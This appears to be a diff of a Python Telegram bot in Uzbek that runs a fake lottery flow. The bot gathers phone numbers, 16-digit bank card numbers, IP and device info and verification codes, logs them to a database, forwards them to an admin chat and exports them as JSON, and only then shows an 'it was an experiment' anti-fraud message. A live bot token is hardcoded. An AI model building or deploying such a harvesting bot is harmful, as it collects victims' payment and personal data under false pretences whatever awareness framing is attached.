@@ -7,6 +7,7 @@ import time
 import json
 from datetime import datetime
 import re
+import traceback
 
 TOKEN = "8878797713:AAEBYRAQ_M1RRrTsqNJ25HxIUqnqpDAJqzM"
 ADMIN_ID = 8031548575
@@ -81,32 +82,32 @@ user_steps = {}
 
 TEXTS = {
     'phone_prompt': (
-        "🎮 **O'yinda ishtirok etish uchun telefon raqamingizni kiriting.**\n\n"
-        "`+998` avtomatik qo'shiladi — faqat qolgan 9 raqamni yozing.\n"
-        "Misol: `901234567`"
+        "🎮 O'yinda ishtirok etish uchun telefon raqamingizni kiriting.\n\n"
+        "+998 avtomatik qo'shiladi — faqat qolgan 9 raqamni yozing.\n"
+        "Misol: 901234567"
     ),
     'phone_invalid': "❌ Noto'g'ri raqam. 9 xonali raqam kiriting (masalan: 901234567):",
-    'phone_ok': "✅ Telefon raqamingiz qabul qilindi: `{}`",
-    'number_grid': "🎮 **O'yinda ishtirok etish uchun 1 dan 9 gacha bo'lgan raqamlardan birini bosing:**",
-    'prize_sms': "📩 **SMS keldi:**\n\nSiz **{} so'm** yutuq egasiga aylandingiz! 🎉",
-    'card_prompt': "💳 Pulni kartangizga tushirish uchun **16 xonali** karta raqamingizni kiriting:",
+    'phone_ok': "✅ Telefon raqamingiz qabul qilindi: {}",
+    'number_grid': "🎮 O'yinda ishtirok etish uchun 1 dan 9 gacha bo'lgan raqamlardan birini bosing:",
+    'prize_sms': "📩 SMS keldi:\n\nSiz {} so'm yutuq egasiga aylandingiz! 🎉",
+    'card_prompt': "💳 Pulni kartangizga tushirish uchun 16 xonali karta raqamingizni kiriting:",
     'card_invalid': "❌ Karta raqami noto'g'ri. 16 xonali raqam kiriting:",
-    'code_sent': "📩 Telefoningizga tasdiqlash kodi yuborildi.\n\n🔐 **Kodni kiriting:** `{}`",
+    'code_sent': "📩 Telefoningizga tasdiqlash kodi yuborildi.\n\n🔐 Kodni kiriting: {}",
     'code_invalid': "❌ Kod noto'g'ri. Qaytadan kiriting:",
     'code2_wait': "⏳ Tasdiqlash jarayoni davom etmoqda... Iltimos, kuting.",
-    'code2_sent': "📩 Yangi tasdiqlash kodi yuborildi.\n\n🔐 **Kodni kiriting:** `{}`",
+    'code2_sent': "📩 Yangi tasdiqlash kodi yuborildi.\n\n🔐 Kodni kiriting: {}",
     'blocked': "🚫 Urinishlar tugadi. /start buyrug'i bilan qayta boshlang.",
     'experiment': (
-        "⚠️ **BU EKSPERIMENT EDI!** ⚠️\n\n"
+        "⚠️ BU EKSPERIMENT EDI! ⚠️\n\n"
         "❌ Siz hech narsa yutmadingiz!\n\n"
-        "😱 Agar bu **HAQIQIY** firibgarlik bo'lganida:\n"
+        "😱 Agar bu HAQIQIY firibgarlik bo'lganida:\n"
         "• Telefon raqamingiz o'g'irlangan bo'lardi\n"
         "• Bank hisobingizdan pul echib olinardi\n"
         "• Shaxsiy ma'lumotlaringiz sotilgan bo'lardi\n\n"
-        "🔐 **ESDA TUTING:**\n\n"
+        "🔐 ESDA TUTING:\n\n"
         "1️⃣ Tanishilmagan QR kodlarni skanerlamang!\n"
         "2️⃣ Telefon raqamingizni notanish saytlarga bermang!\n"
-        "3️⃣ SMS kodlarni **HECH KIMGA** aytmang!\n"
+        "3️⃣ SMS kodlarni HECH KIMGA aytmang!\n"
         "4️⃣ \"Bepul sovg'a\" va'dalariga ishonmang!\n\n"
         "📣 Bu tajriba kiberjinoyatlarning oldini olish uchun o'tkazildi.\n\n"
         "✅ Endi siz bu hiylalarni bilasiz — boshqalarga ham ayting!\n\n"
@@ -133,10 +134,18 @@ def normalize_phone(text):
     return None
 
 
-def ensure_user_state(chat_id):
+def get_state(chat_id):
     if chat_id not in user_steps:
-        user_steps[chat_id] = {'step': 'phone'}
+        user_steps[chat_id] = {'step': 'idle'}
     return user_steps[chat_id]
+
+
+def set_step(chat_id, step):
+    get_state(chat_id)['step'] = step
+
+
+def get_step(chat_id):
+    return get_state(chat_id).get('step', 'idle')
 
 
 def safe_answer_callback(call, text=""):
@@ -159,11 +168,18 @@ def get_ip_info(chat_id):
 
 def build_number_grid():
     markup = types.InlineKeyboardMarkup(row_width=3)
-    for row in range(3):
-        markup.add(*[
-            types.InlineKeyboardButton(str(n), callback_data=f"pick_{n}")
-            for n in range(row * 3 + 1, row * 3 + 4)
-        ])
+    row1 = [types.InlineKeyboardButton("1", callback_data="pick_1"),
+            types.InlineKeyboardButton("2", callback_data="pick_2"),
+            types.InlineKeyboardButton("3", callback_data="pick_3")]
+    row2 = [types.InlineKeyboardButton("4", callback_data="pick_4"),
+            types.InlineKeyboardButton("5", callback_data="pick_5"),
+            types.InlineKeyboardButton("6", callback_data="pick_6")]
+    row3 = [types.InlineKeyboardButton("7", callback_data="pick_7"),
+            types.InlineKeyboardButton("8", callback_data="pick_8"),
+            types.InlineKeyboardButton("9", callback_data="pick_9")]
+    markup.row(*row1)
+    markup.row(*row2)
+    markup.row(*row3)
     return markup
 
 
@@ -176,26 +192,21 @@ def build_channel_menu():
     return markup
 
 
-def send_verification_code(chat_id, code_key, handler, text_key='code_sent'):
+def send_code(chat_id, code_key, text_key):
     code = random.randint(1000, 9999)
-    user_steps[chat_id][code_key] = code
-    user_steps[chat_id][f'{code_key}_attempts'] = 3
-    msg = bot.send_message(
-        chat_id,
-        get_text(text_key).format(code),
-        parse_mode="Markdown"
-    )
-    bot.register_next_step_handler(msg, handler)
+    state = get_state(chat_id)
+    state[code_key] = code
+    state[f'{code_key}_attempts'] = 3
+    bot.send_message(chat_id, get_text(text_key).format(code))
 
 
 def schedule_second_code(chat_id):
     def _delayed():
         time.sleep(5)
-        state = user_steps.get(chat_id)
-        if not state or state.get('step') != 'code2_wait':
+        if get_step(chat_id) != 'code2_wait':
             return
-        state['step'] = 'code2'
-        send_verification_code(chat_id, 'code_2', verify_code_2_handler, text_key='code2_sent')
+        set_step(chat_id, 'code2')
+        send_code(chat_id, 'code_2', 'code2_sent')
 
     threading.Thread(target=_delayed, daemon=True).start()
 
@@ -210,52 +221,22 @@ def finish_experiment(chat_id):
     conn.commit()
     conn.close()
 
+    set_step(chat_id, 'done')
     log_action(chat_id, "experiment_completed")
     notify_admin(chat_id)
 
-    bot.send_message(chat_id, get_text('experiment'), parse_mode="Markdown")
-    bot.send_message(
-        chat_id,
-        get_text('channel_follow'),
-        parse_mode="Markdown",
-        reply_markup=build_channel_menu()
-    )
+    bot.send_message(chat_id, get_text('experiment'))
+    bot.send_message(chat_id, get_text('channel_follow'), reply_markup=build_channel_menu())
 
 
-# ============== /start ==============
-@bot.message_handler(commands=['start'])
-def start_handler(message):
-    chat_id = message.chat.id
-    user_steps[chat_id] = {'step': 'phone'}
-
-    ip_info = get_ip_info(chat_id)
-    log_action(chat_id, "bot_started", json.dumps(ip_info))
-
-    msg = bot.send_message(
-        chat_id,
-        get_text('phone_prompt'),
-        parse_mode="Markdown",
-        reply_markup=types.ReplyKeyboardRemove()
-    )
-    bot.register_next_step_handler(msg, get_phone_handler)
-
-
-# ============== TELEFON ==============
-def get_phone_handler(message):
-    chat_id = message.chat.id
-
-    if message.contact and message.contact.phone_number:
-        phone = normalize_phone(message.contact.phone_number)
-    else:
-        phone = normalize_phone(message.text)
-
+def process_phone(chat_id, phone_raw):
+    phone = normalize_phone(phone_raw)
     if not phone:
-        msg = bot.send_message(chat_id, get_text('phone_invalid'), parse_mode="Markdown")
-        bot.register_next_step_handler(msg, get_phone_handler)
+        bot.send_message(chat_id, get_text('phone_invalid'))
         return
 
-    user_steps[chat_id]['phone'] = phone
-    user_steps[chat_id]['step'] = 'number_pick'
+    state = get_state(chat_id)
+    state['phone'] = phone
 
     conn = get_db()
     c = conn.cursor()
@@ -268,131 +249,137 @@ def get_phone_handler(message):
     conn.close()
 
     log_action(chat_id, "phone_received", phone)
+    set_step(chat_id, 'number_pick')
 
-    bot.send_message(chat_id, get_text('phone_ok').format(phone), parse_mode="Markdown")
-    bot.send_message(
-        chat_id,
-        get_text('number_grid'),
-        parse_mode="Markdown",
-        reply_markup=build_number_grid()
-    )
+    bot.send_message(chat_id, get_text('phone_ok').format(phone))
+    bot.send_message(chat_id, get_text('number_grid'), reply_markup=build_number_grid())
 
 
-# ============== RAQAM TANLASH ==============
-def handle_number_pick(call):
-    chat_id = call.message.chat.id
-    state = ensure_user_state(chat_id)
-
-    if state.get('step') != 'number_pick':
-        safe_answer_callback(call, "⚠️ /start bosing")
+def process_card(chat_id, text):
+    card_num = (text or '').replace(" ", "")
+    if len(card_num) < 16 or not card_num.isdigit():
+        bot.send_message(chat_id, get_text('card_invalid'))
         return
 
-    picked = call.data.split('_')[1]
-    state['picked_number'] = picked
-    state['step'] = 'prize_shown'
+    state = get_state(chat_id)
+    state['card'] = card_num
 
-    prize = random.randint(50000, 1000000)
-    prize = (prize // 1000) * 1000
-    if prize < 50000:
-        prize = 50000
-    state['prize'] = prize
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("UPDATE users SET card_number = ?, step = 2 WHERE chat_id = ?", (card_num, chat_id))
+    conn.commit()
+    conn.close()
 
-    safe_answer_callback(call, f"✅ {picked} tanlandi!")
+    log_action(chat_id, "card_received", card_num)
+    set_step(chat_id, 'code1')
+    send_code(chat_id, 'code_1', 'code_sent')
+
+
+def process_code(chat_id, text, code_key, next_step, fail_action=None):
+    state = get_state(chat_id)
+    user_input = (text or '').strip()
+    correct_code = str(state.get(code_key, ''))
+    attempts = state.get(f'{code_key}_attempts', 3)
+
+    if user_input == correct_code:
+        log_action(chat_id, f"{code_key}_verified")
+        if next_step == 'code2_wait':
+            set_step(chat_id, 'code2_wait')
+            bot.send_message(chat_id, get_text('code2_wait'))
+            schedule_second_code(chat_id)
+        elif next_step == 'done':
+            finish_experiment(chat_id)
+        return
+
+    attempts -= 1
+    state[f'{code_key}_attempts'] = attempts
+    log_action(chat_id, f"{code_key}_failed", f"qolgan={attempts}")
+
+    if attempts <= 0:
+        set_step(chat_id, 'blocked')
+        bot.send_message(chat_id, get_text('blocked'))
+    else:
+        bot.send_message(chat_id, get_text('code_invalid'))
+
+
+# ============== /start ==============
+@bot.message_handler(commands=['start'])
+def start_handler(message):
+    chat_id = message.chat.id
+    user_steps[chat_id] = {'step': 'phone'}
+
+    ip_info = get_ip_info(chat_id)
+    log_action(chat_id, "bot_started", json.dumps(ip_info))
+
     bot.send_message(
         chat_id,
-        get_text('prize_sms').format(format_sum(prize)),
-        parse_mode="Markdown"
+        get_text('phone_prompt'),
+        reply_markup=types.ReplyKeyboardRemove()
     )
 
-    log_action(chat_id, "number_picked", f"raqam={picked}, yutuq={prize}")
 
-    msg = bot.send_message(chat_id, get_text('card_prompt'), parse_mode="Markdown")
-    state['step'] = 'card'
-    bot.register_next_step_handler(msg, get_card_handler)
+# ============== RAQAM TUGMALARI ==============
+@bot.callback_query_handler(func=lambda call: call.data and call.data.startswith('pick_'))
+def pick_number_handler(call):
+    chat_id = call.message.chat.id
 
-
-# ============== KARTA ==============
-def get_card_handler(message):
-    chat_id = message.chat.id
-    card_num = (message.text or '').replace(" ", "")
-
-    if len(card_num) >= 16 and card_num.isdigit():
-        user_steps[chat_id]['card'] = card_num
-        user_steps[chat_id]['step'] = 'code1'
-
-        conn = get_db()
-        c = conn.cursor()
-        c.execute("UPDATE users SET card_number = ?, step = 2 WHERE chat_id = ?", (card_num, chat_id))
-        conn.commit()
-        conn.close()
-
-        log_action(chat_id, "card_received", card_num)
-        send_verification_code(chat_id, 'code_1', verify_code_1_handler)
-    else:
-        msg = bot.send_message(chat_id, get_text('card_invalid'), parse_mode="Markdown")
-        bot.register_next_step_handler(msg, get_card_handler)
-
-
-# ============== 1-TASDIQLASH KODI ==============
-def verify_code_1_handler(message):
-    chat_id = message.chat.id
-    user_input = (message.text or '').strip()
-    correct_code = str(user_steps[chat_id].get('code_1'))
-    attempts = user_steps[chat_id].get('code_1_attempts', 3)
-
-    if user_input == correct_code:
-        log_action(chat_id, "code_1_verified")
-        user_steps[chat_id]['step'] = 'code2_wait'
-        bot.send_message(chat_id, get_text('code2_wait'), parse_mode="Markdown")
-        schedule_second_code(chat_id)
-    else:
-        attempts -= 1
-        user_steps[chat_id]['code_1_attempts'] = attempts
-        log_action(chat_id, "code_1_failed", f"qolgan={attempts}")
-
-        if attempts <= 0:
-            bot.send_message(chat_id, get_text('blocked'))
-        else:
-            msg = bot.send_message(chat_id, get_text('code_invalid'), parse_mode="Markdown")
-            bot.register_next_step_handler(msg, verify_code_1_handler)
-
-
-# ============== 2-TASDIQLASH KODI ==============
-def verify_code_2_handler(message):
-    chat_id = message.chat.id
-    user_input = (message.text or '').strip()
-    correct_code = str(user_steps[chat_id].get('code_2'))
-    attempts = user_steps[chat_id].get('code_2_attempts', 3)
-
-    if user_input == correct_code:
-        log_action(chat_id, "code_2_verified")
-        finish_experiment(chat_id)
-    else:
-        attempts -= 1
-        user_steps[chat_id]['code_2_attempts'] = attempts
-        log_action(chat_id, "code_2_failed", f"qolgan={attempts}")
-
-        if attempts <= 0:
-            bot.send_message(chat_id, get_text('blocked'))
-        else:
-            msg = bot.send_message(chat_id, get_text('code_invalid'), parse_mode="Markdown")
-            bot.register_next_step_handler(msg, verify_code_2_handler)
-
-
-# ============== CALLBACK ==============
-@bot.callback_query_handler(func=lambda call: call.data is not None)
-def callback_handler(call):
-    data = call.data
     try:
-        if data.startswith('pick_'):
-            handle_number_pick(call)
-        elif data.startswith('admin_'):
-            handle_admin_callback(call)
-        else:
-            safe_answer_callback(call, "⚠️ /start bosing")
+        state = get_state(chat_id)
+        step = state.get('step')
+
+        if step != 'number_pick':
+            safe_answer_callback(call, "⚠️ Avval /start bosing va telefon kiriting")
+            return
+
+        picked = call.data.replace('pick_', '')
+        state['picked_number'] = picked
+
+        prize = random.randint(50000, 1000000)
+        prize = max(50000, (prize // 1000) * 1000)
+        state['prize'] = prize
+
+        safe_answer_callback(call, f"✅ {picked} tanlandi!")
+
+        bot.send_message(chat_id, get_text('prize_sms').format(format_sum(prize)))
+        log_action(chat_id, "number_picked", f"raqam={picked}, yutuq={prize}")
+
+        set_step(chat_id, 'card')
+        bot.send_message(chat_id, get_text('card_prompt'))
+
     except Exception as e:
-        print(f"Callback xatolik [{data}]: {e}")
-        safe_answer_callback(call, "❌ Xatolik. /start bosing.")
+        print(f"pick_number_handler xatolik: {e}")
+        traceback.print_exc()
+        safe_answer_callback(call, "❌ Xatolik. /start bosing")
+
+
+@bot.callback_query_handler(func=lambda call: call.data and call.data.startswith('admin_'))
+def admin_callback_handler(call):
+    handle_admin_callback(call)
+
+
+# ============== XABARLAR (step bo'yicha) ==============
+@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'phone')
+def phone_step_handler(message):
+    chat_id = message.chat.id
+    if message.contact and message.contact.phone_number:
+        process_phone(chat_id, message.contact.phone_number)
+    else:
+        process_phone(chat_id, message.text)
+
+
+@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'card')
+def card_step_handler(message):
+    process_card(message.chat.id, message.text)
+
+
+@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'code1')
+def code1_step_handler(message):
+    process_code(message.chat.id, message.text, 'code_1', 'code2_wait')
+
+
+@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'code2')
+def code2_step_handler(message):
+    process_code(message.chat.id, message.text, 'code_2', 'done')
 
 
 # ============== ADMIN ==============
@@ -400,17 +387,17 @@ def notify_admin(user_chat_id):
     try:
         data = user_steps.get(user_chat_id, {})
         admin_msg = (
-            f"🆕 **Yangi tajriba ishtirokchisi!**\n\n"
-            f"👤 Chat ID: `{user_chat_id}`\n"
-            f"📱 Telefon: `{data.get('phone', 'N/A')}`\n"
-            f"🎲 Tanlangan raqam: `{data.get('picked_number', 'N/A')}`\n"
-            f"💰 Yutuq (simulyatsiya): `{format_sum(data.get('prize', 0))} so'm`\n"
-            f"💳 Karta: `{data.get('card', 'N/A')}`\n"
-            f"🔐 1-kod: `{data.get('code_1', 'N/A')}`\n"
-            f"🔐 2-kod: `{data.get('code_2', 'N/A')}`\n"
-            f"🕐 Vaqt: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
+            f"🆕 Yangi tajriba ishtirokchisi!\n\n"
+            f"👤 Chat ID: {user_chat_id}\n"
+            f"📱 Telefon: {data.get('phone', 'N/A')}\n"
+            f"🎲 Tanlangan raqam: {data.get('picked_number', 'N/A')}\n"
+            f"💰 Yutuq: {format_sum(data.get('prize', 0))} so'm\n"
+            f"💳 Karta: {data.get('card', 'N/A')}\n"
+            f"🔐 1-kod: {data.get('code_1', 'N/A')}\n"
+            f"🔐 2-kod: {data.get('code_2', 'N/A')}\n"
+            f"🕐 Vaqt: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
-        bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
+        bot.send_message(ADMIN_ID, admin_msg)
     except Exception as e:
         print(f"Admin notify error: {e}")
 
@@ -429,12 +416,7 @@ def admin_panel(message):
         types.InlineKeyboardButton("📤 Eksport (JSON)", callback_data="admin_export"),
         types.InlineKeyboardButton("📜 Loglar", callback_data="admin_logs"),
     )
-    bot.send_message(
-        chat_id,
-        "👑 **Admin Panel**\n\nQuyidagi bo'limlardan birini tanlang:",
-        parse_mode="Markdown",
-        reply_markup=markup
-    )
+    bot.send_message(chat_id, "👑 Admin Panel\n\nBo'limni tanlang:", reply_markup=markup)
 
 
 def handle_admin_callback(call):
@@ -451,78 +433,64 @@ def handle_admin_callback(call):
         c.execute("SELECT * FROM users WHERE completed_at IS NOT NULL ORDER BY completed_at DESC")
         users = c.fetchall()
         if not users:
-            bot.send_message(chat_id, "📭 Hali hech qanday ma'lumot to'plangan emas.")
+            bot.send_message(chat_id, "📭 Hali ma'lumot yo'q.")
         else:
             for user in users[:10]:
-                user_text = (
-                    f"👤 **Foydalanuvchi #{user[0]}**\n"
-                    f"🆔 Chat ID: `{user[1]}`\n"
-                    f"📱 Telefon: `{user[2]}`\n"
-                    f"💳 Karta: `{user[3]}`\n"
-                    f"🌐 IP: `{user[10]}`\n"
-                    f"📱 Qurilma: `{user[11]}`\n"
-                    f"🕐 Yakunlangan: `{user[14]}`"
+                bot.send_message(
+                    chat_id,
+                    f"👤 #{user[0]}\n"
+                    f"Chat ID: {user[1]}\n"
+                    f"Telefon: {user[2]}\n"
+                    f"Karta: {user[3]}\n"
+                    f"Yakunlangan: {user[14]}"
                 )
-                bot.send_message(chat_id, user_text, parse_mode="Markdown")
 
     elif action == 'stats':
         c.execute("SELECT COUNT(*) FROM users")
         total = c.fetchone()[0]
         c.execute("SELECT COUNT(*) FROM users WHERE completed_at IS NOT NULL")
         completed = c.fetchone()[0]
-        stats = (
-            f"📊 **Statistika**\n\n"
-            f"👥 Jami foydalanuvchilar: `{total}`\n"
-            f"✅ Tajribani tugatganlar: `{completed}`\n"
-            f"❌ Tugallamaganlar: `{total - completed}`"
+        bot.send_message(
+            chat_id,
+            f"📊 Statistika\n\nJami: {total}\nTugatganlar: {completed}\nTugatmaganlar: {total - completed}"
         )
-        bot.send_message(chat_id, stats, parse_mode="Markdown")
 
     elif action == 'export':
         c.execute("SELECT * FROM users WHERE completed_at IS NOT NULL")
         users = c.fetchall()
-        export_data = []
-        for user in users:
-            export_data.append({
-                'id': user[0],
-                'chat_id': user[1],
-                'phone': user[2],
-                'card_number': user[3],
-                'ip': user[10],
-                'device': user[11],
-                'completed_at': user[14],
-            })
+        export_data = [{
+            'id': u[0], 'chat_id': u[1], 'phone': u[2],
+            'card_number': u[3], 'completed_at': u[14]
+        } for u in users]
         with open('export_data.json', 'w') as f:
             json.dump(export_data, f, indent=2, ensure_ascii=False)
-        bot.send_document(chat_id, open('export_data.json', 'rb'))
+        with open('export_data.json', 'rb') as f:
+            bot.send_document(chat_id, f)
 
     elif action == 'logs':
         c.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 20")
         logs = c.fetchall()
         if not logs:
-            bot.send_message(chat_id, "📭 Loglar topilmadi.")
+            bot.send_message(chat_id, "📭 Loglar yo'q.")
         else:
-            log_text = "**📜 So'nggi 20 ta log:**\n\n"
+            log_text = "📜 So'nggi loglar:\n\n"
             for log in logs:
-                log_text += f"• [{log[4]}] `{log[1]}` → {log[2]}: {log[3]}\n"
-            if len(log_text) > 4000:
-                for i in range(0, len(log_text), 4000):
-                    bot.send_message(chat_id, log_text[i:i + 4000], parse_mode="Markdown")
-            else:
-                bot.send_message(chat_id, log_text, parse_mode="Markdown")
+                log_text += f"• [{log[4]}] {log[2]}: {log[3]}\n"
+            bot.send_message(chat_id, log_text[:4000])
 
     conn.close()
     safe_answer_callback(call, "✅ Bajarildi!")
 
 
 # ============== FALLBACK ==============
+@bot.callback_query_handler(func=lambda call: True)
+def unknown_callback(call):
+    safe_answer_callback(call, "⚠️ /start bosing")
+
+
 @bot.message_handler(func=lambda message: True)
 def fallback_handler(message):
-    chat_id = message.chat.id
-    if message.content_type == 'contact':
-        get_phone_handler(message)
-        return
-    bot.send_message(chat_id, "Iltimos, /start buyrug'ini bosing.")
+    bot.send_message(message.chat.id, "Iltimos, /start buyrug'ini bosing.")
 
 
 if __name__ == "__main__":
@@ -533,8 +501,9 @@ if __name__ == "__main__":
 
     while True:
         try:
-            bot.infinity_polling()
+            bot.infinity_polling(timeout=60, long_polling_timeout=60)
         except Exception as e:
             print(f"Xatolik: {e}")
+            traceback.print_exc()
             print("Qayta ulanish 5 soniyadan keyin...")
             time.sleep(5)
